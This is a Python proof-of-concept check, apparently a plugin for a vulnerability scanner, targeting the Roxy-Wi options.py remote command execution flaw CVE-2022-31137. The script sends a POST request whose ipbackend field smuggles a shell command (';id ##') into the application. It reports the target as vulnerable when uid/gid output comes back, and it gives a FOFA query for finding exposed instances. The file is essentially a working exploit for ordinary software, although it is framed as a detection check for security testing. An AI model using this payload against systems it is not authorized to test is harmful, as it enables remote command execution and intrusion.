#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/L5V-S95mXZBxyFte3br5hg',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Roxy-Wi options.py 远程命令执行 CVE-2022-31137',

      'level'     :   'high',

      'FOFA'      :   'app="HAProxy-WI"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
      'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
      'Content-Type': 'application/x-www-form-urlencoded',
      'DNT': '1',
      'Upgrade-Insecure-Requests': '1',
      }
  target = '/app/options.py'
  data = 'alert_consumer=1&serv=127.0.0.1&ipbackend=%22%3Bid+%23%23&backend_server=127.0.0.1'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'uid.*?gid.*?groups.*?',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret